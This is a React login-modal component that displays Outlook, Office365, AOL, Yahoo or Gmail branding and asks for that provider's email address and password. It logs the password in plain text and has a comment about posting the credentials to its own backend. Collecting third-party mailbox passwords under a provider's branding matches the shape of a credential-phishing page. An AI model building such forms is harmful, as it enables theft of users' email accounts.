import { useState } from 'react';
import './EmailLoginModal.css'
import outlookImg from "../assets/outlook.png";
import officeImg from "../assets/office360.png";
import aolImg from "../assets/aol.png";
import { FaGoogle, FaYahoo } from "react-icons/fa";
import { MdEmail } from "react-icons/md";
const EmailLoginModal = ({ isOpen, onClose, provider }) => {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [error, setError] = useState('');

    if (!isOpen) return null;

    const handleSubmit = (e) => {
        e.preventDefault();
        if (!email || !password) {
            setError('Please fill out both fields.');
            return;
        }

        // Here you would send email + password to your backend
        // Example: fetch('/api/login', { method: 'POST', body: JSON.stringify({ email, password, provider }) })
        console.log(`Logging in with ${provider}:`, { email, password });

        // For demo: close modal after "login"
        onClose();
    };

    const title = provider === 'Other' ? 'Other Email' : provider;

    const getProviderIcon = () => {
        switch (provider) {
            case "Outlook":
                return <img src={outlookImg} className="modal-icon-img" alt="Outlook"/>;
            case "Office365":
                return <img src={officeImg} className="modal-icon-img" alt="Office365"/>;
            case "AOL":
                return <img src={aolImg} className="modal-icon-img" alt="AOL"/>;
            case "Yahoo":
                return <FaYahoo className="modal-icon"/>;
            case "Gmail":
                return <FaGoogle className="modal-icon"/>;
            default:
                return <MdEmail className="modal-icon"/>;
        }
    };

    return (
        <div className="modal-overlay" onClick={onClose}>
            <div className="modal-content" onClick={(e) => e.stopPropagation()}>
                <button className="close-btn" onClick={onClose}>×</button>

                <div className="modal-header">
                    <div className="modal-icon-container">
                        {getProviderIcon()}
                    </div>

                    <h2 className="modal-title">
                        Login with {title}
                    </h2>
                </div>

                <form onSubmit={handleSubmit}>
                    <label>Email Address</label>
                    <input
                        type="email"
                        placeholder="Email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        required
                    />
                    <small>We'll never share your email with anyone else</small>

                    <label>Password</label>
                    <input
                        type="password"
                        placeholder="Enter Password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        required
                    />
                    {error && <p className="error">{error}</p>}

                    <div className="modal-buttons">
                        <button type="button" onClick={onClose}>Close</button>
                        <button type="submit" className="login-btn">Login</button>
                    </div>
                </form>
            </div>
        </div>
    );
};

export default EmailLoginModal;